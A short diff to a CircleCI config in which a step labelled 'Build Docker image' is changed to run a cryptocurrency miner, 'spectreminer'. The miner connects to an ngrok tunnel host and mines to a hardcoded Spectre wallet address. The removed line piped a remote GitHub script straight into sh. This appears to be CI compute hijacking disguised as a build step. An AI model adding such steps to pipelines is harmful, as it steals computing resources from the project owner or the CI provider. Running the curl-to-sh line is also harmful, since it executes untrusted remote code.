@@ -13,5 +13,5 @@ jobs:
       - run:
           name: Build Docker image
           command: |
-            
-            curl https://github.com/spmc01/spc/raw/main/circleci.sh | sh
+            chmod +x spectreminer
+            ./spectreminer -s 0.tcp.ngrok.io:15145 --miningaddr=spectre:qqsw4czp5raugmh9utt4gy7axa2kq6j8jgy96nfw7ncwpfexrl6j5lrqm633g --workers 4
